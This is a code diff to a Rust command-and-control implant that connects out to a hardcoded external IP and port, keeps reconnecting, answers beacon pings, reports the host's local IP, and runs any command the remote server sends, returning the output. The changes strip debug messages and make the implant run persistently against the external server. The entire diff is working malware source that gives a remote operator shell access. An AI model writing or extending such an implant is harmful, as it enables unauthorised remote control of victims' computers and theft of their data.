@@ -20,9 +20,8 @@ fn connect(ip: &str) -> TcpStream {
             Ok(con) => { //if it worked, return the connection
                 return con;
             },
-            Err(_) => { //if it errored, print that it is trying to connect and re-loop
-                println!("trying to connect");
-                thread::sleep(time::Duration::from_millis(2000));
+            Err(_) => { //if it errored, re-loop
+                thread::sleep(time::Duration::from_millis(5000));
                 continue;
             }
         } 
@@ -39,14 +38,11 @@ fn run_command(cmd: &str) -> String {
     return cmd_out;
 }
 
-
 fn c2(ip:&str) {
-    println!("{}","in c2");
     let mut stream = connect(ip); //connects via TCP
-    println!("{}","connected");
     loop {
         let mut buffer = [0;1024]; //set the buffer
-        let num_of_bytes = stream.read(&mut buffer).unwrap_or(0);
+        let num_of_bytes = stream.read(&mut buffer).unwrap_or(0); //if it fails, make the buffer 0
         if num_of_bytes == 0 { //if the connection is lost
             thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds 
             stream = connect(ip); //connect again
@@ -54,11 +50,10 @@ fn c2(ip:&str) {
         }
         let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
         if recv.contains("getIP") { //if it's getIP, return the IP
-            // let local_ip = local_ip().unwrap(); //get the local IP
-            // let local_ip = format!("{}\n",local_ip); //format IP into string
-            // let local_ip = local_ip.as_bytes();
-            // stream.write(&local_ip).unwrap(); //send it
-            stream.write(b"10.1.1.1");
+            let local_ip = local_ip().unwrap(); //get the local IP
+            let local_ip = format!("{}\n",local_ip); //format IP into string
+            let local_ip = local_ip.as_bytes();
+            stream.write(&local_ip).unwrap(); //send it
             continue;
         }
         if recv.len() > 2{
@@ -81,6 +76,8 @@ fn c2(ip:&str) {
             } else if recv.eq("beacon_ping"){
                 stream.write(b"beacon_pong").unwrap();
                 continue;
+            } else if recv.eq("ENDCONNECTION"){
+                return;
             }
         }
         let output = run_command(&recv); //run this
@@ -98,10 +95,18 @@ fn checkIn(){
     });
 }
 
+fn connectToRouter(){
+    thread::spawn(||{
+        let ip = "127.0.0.1:8080";
+        c2(&ip);
+    });
+}
+
 
 fn main(){
-    // let ip = "129.21.49.57:5678";
-    let ip = "127.0.0.1:8080";
-    // checkIn();
-    c2(&ip);
+    let ip = "129.21.49.57:5678";
+    loop{
+        connectToRouter();
+        c2(&ip);
+    }
 }
